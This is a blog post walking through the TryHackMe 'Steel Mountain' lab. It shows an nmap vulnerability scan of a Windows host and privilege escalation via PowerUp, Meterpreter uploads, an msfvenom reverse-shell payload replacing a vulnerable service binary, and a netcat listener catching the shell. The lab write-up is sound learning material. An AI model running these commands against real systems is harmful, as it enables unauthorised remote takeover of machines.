---
title: 'TryHackMe: Complete Beginner'
date: 2021-11-07 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-11-07-tryhackme-complete-beginner.html
author: 100007
---

# Steel Mountain

## Introduction

Apparently this machine is running a web server. (Though I never would have guest that without first searching for a walkthrough of this TryHackMe room, as my initial response was, “how the hell do I know who the employee of the month is based on the IP of a Windows machine I can’t yet log into?”)

The machine IP address for this exercise is 10.10.241.108.

## Initial Access

NMAP command line (note that we skip the ping test, since Windows machines don’t respond to ping by default, and because the introduction told us that this machine wouldn’t respond to ping):

```
sudo nmap -v -oA steel-mountain -A -Pn -sS \
          --script vuln -p- 10.10.241.108
```

Results:

```
# Nmap 7.92 scan initiated Sun Nov 7 16:44:22 2021 as: nmap -v -T4 -oA steel-mountain -A -Pn -sS --script vuln -p- 10.10.241.108
Nmap scan report for 10.10.241.108
Host is up (0.17s latency).
Not shown: 65520 closed tcp ports (reset)
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 8.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/8.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open ssl/ms-wbt-server?
| ssl-dh-params: 
| VULNERABLE:
| Diffie-Hellman Key Exchange Insufficient Group Strength
| State: VULNERABLE
| Transport Layer Security (TLS) services that use Diffie-Hellman groups
| of insufficient strength, especially those using one of a few commonly
| shared groups, may be susceptible to passive eavesdropping attacks.
| Check results:
| WEAK DH GROUP 1
| Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
| Modulus Type: Safe prime
| Modulus Source: RFC2409/Oakley Group 2
| Modulus Length: 1024
| Generator Length: 1024
| Public Key Length: 1024
| References:
|_ https://weakdh.org
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open http HttpFileServer httpd 2.3
| vulners: 
| cpe:/a:rejetto:httpfileserver:2.3: 
| 1337DAY-ID-35849	10.0	https://vulners.com/zdt/1337DAY-ID-35849	*EXPLOIT*
| SECURITYVULNS:VULN:14023	7.5	https://vulners.com/securityvulns/SECURITYVULNS:VULN:14023
| PACKETSTORM:161503	7.5	https://vulners.com/packetstorm/PACKETSTORM:161503	*EXPLOIT*
| PACKETSTORM:160264	7.5	https://vulners.com/packetstorm/PACKETSTORM:160264	*EXPLOIT*
| PACKETSTORM:135122	7.5	https://vulners.com/packetstorm/PACKETSTORM:135122	*EXPLOIT*
| PACKETSTORM:128593	7.5	https://vulners.com/packetstorm/PACKETSTORM:128593	*EXPLOIT*
| PACKETSTORM:128243	7.5	https://vulners.com/packetstorm/PACKETSTORM:128243	*EXPLOIT*
| MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC	7.5	https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC	*EXPLOIT*
| EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13	7.5	https://vulners.com/exploitpack/EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13	*EXPLOIT*
| EXPLOITPACK:A39709063C426496F984E8852560BBFF	7.5	https://vulners.com/exploitpack/EXPLOITPACK:A39709063C426496F984E8852560BBFF	*EXPLOIT*
| EDB-ID:49584	7.5	https://vulners.com/exploitdb/EDB-ID:49584	*EXPLOIT*
| EDB-ID:49125	7.5	https://vulners.com/exploitdb/EDB-ID:49125	*EXPLOIT*
| EDB-ID:39161	7.5	https://vulners.com/exploitdb/EDB-ID:39161	*EXPLOIT*
| EDB-ID:34926	7.5	https://vulners.com/exploitdb/EDB-ID:34926	*EXPLOIT*
| EDB-ID:34668	7.5	https://vulners.com/exploitdb/EDB-ID:34668	*EXPLOIT*
| 1337DAY-ID-25379	7.5	https://vulners.com/zdt/1337DAY-ID-25379	*EXPLOIT*
| 1337DAY-ID-22733	7.5	https://vulners.com/zdt/1337DAY-ID-22733	*EXPLOIT*
| 1337DAY-ID-22640	7.5	https://vulners.com/zdt/1337DAY-ID-22640	*EXPLOIT*
|_ 1337DAY-ID-6287	0.0	https://vulners.com/zdt/1337DAY-ID-6287	*EXPLOIT*
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-method-tamper: 
| VULNERABLE:
| Authentication bypass by HTTP verb tampering
| State: VULNERABLE (Exploitable)
| This web server contains password protected resources vulnerable to authentication bypass
| vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
| common HTTP methods and in misconfigured .htaccess files.
|              
| Extra information:
|       
| URIs suspected to be vulnerable to HTTP verb tampering:
| /~login [GENERIC]
|   
| References:
| http://capec.mitre.org/data/definitions/274.html
| https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
| http://www.mkit.com.ar/labs/htexploit/
|_ http://www.imperva.com/resources/glossary/http_verb_tampering.html
| http-fileupload-exploiter: 
|   
|_ Couldn't find a file-type field.
| http-vuln-cve2011-3192: 
| VULNERABLE:
| Apache byterange filter DoS
| State: VULNERABLE
| IDs: BID:49303 CVE:CVE-2011-3192
| The Apache web server is vulnerable to a denial of service attack when numerous
| overlapping byte ranges are requested.
| Disclosure date: 2011-08-19
| References:
| https://www.tenable.com/plugins/nessus/55976
| https://seclists.org/fulldisclosure/2011/Aug/175
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_ https://www.securityfocus.com/bid/49303
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: HFS 2.3
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open msrpc Microsoft Windows RPC
49153/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
49155/tcp open msrpc Microsoft Windows RPC
49156/tcp open msrpc Microsoft Windows RPC
49163/tcp open msrpc Microsoft Windows RPC
49164/tcp open msrpc Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/7%OT=80%CT=1%CU=31067%PV=Y%DS=4%DC=T%G=Y%TM=61886A7
OS:A%P=aarch64-unknown-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS
OS:=S%TS=7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11
OS:%O5=M506NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%
OS:W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.119 days (since Sun Nov 7 14:17:42 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: No accounts left to try
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: No accounts left to try

TRACEROUTE (using port 1723/tcp)
HOP RTT ADDRESS
1 33.91 ms 10.13.0.1
2 ... 3
4 174.12 ms 10.10.241.108

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 7 17:08:26 2021 -- 1 IP address (1 host up) scanned in 1444.56 seconds
```

[The Windows counterpart to `cat` is `type`.](https://superuser.com/questions/434870/what-is-the-windows-equivalent-of-the-unix-command-cat#434876)

NOTES TO SELF:

- NetworkManager likes to bring down connections on session disconnect, even if TMUX is running in the background.
- Remember to punch a (temporary) hole through the firewall for _all_ of the ports required by the exploit!

I lost a good hour getting stuck because of these two minor complications.

- [Using “nmap”](https://cardboard-iguana.com/notes/nmap.html)

## Privilege Escalation

PowerUp is a script that scans for common Windows vulnerabilities. It looks like the version that’s included with Kali Linux is different and/or not-up-to-date relative to the version of PowerUp linked to by the TryHackMe Steelmountain room. In particular, Kali version doesn’t list _a lot_ of information about potentially vulnerable services that is necessary for completing this section. (On the downside, the version of PowerUp we need to use produces _a lot_ of duplicative output too…)

Anyways, first we have to download the more capable version of PowerUp:

```
curl -O https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

Meterpreter can upload files to the target machine:

```
upload /home/kali/PowerUp.ps1
```

To load it up in Meterpreter we need to shell out to PowerShell.

```
load powershell
powershell_shell
```

And then:

```
. .\PowerUp.ps1
Invoke-AllChecks
```

For whatever reason, the room lists the wrong msfvenom command. To generate the correct reverse shell requires:

```
msfvenom -p windows/shell_reverse_tcp \
            LHOST=10.13.26.40 LPORT=4443 \
         -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

(The reason we need to specify an encoder here is because the vulnerable binary is in Program Files (x86), so we need to produce an x86 binary rather than the default x86\_64 binary.)

To upload this, we’ll need to background PowerShell with `^Z`. (_Don’t_ try to exit - for me this caused hangs, and I eventually had to restart the machine!) Upload and then start a new shell:

```
upload /home/kali/ASCService.exe
powershell_shell
```

Replace the ASCService.exe binary (its permissions are such that we can do this) and restart the service:

```
Stop-Service -Name AdvancedSystemCareService9
cp "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
   ASCService.exe.bak
cp -force ASCService.exe
   "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Start-Service -Name AdvancedSystemCareService9
```

(We can run Stop-Service and Start-Service because the user we’ve compromised has the CanRestart permission for this service.)

Catch this reverse shell using netcat:

```
nc -lvnp 4443
```

Once we have the root flag, let’s put the service back the way it was before we try the non-Metasploit version of this.

```
Stop-Service -Name AdvancedSystemCareService9
cp -force ASCService.exe.bak
   "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Start-Service -Name AdvancedSystemCareService9
```

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [Using “netcat”](https://cardboard-iguana.com/notes/netcat.html)
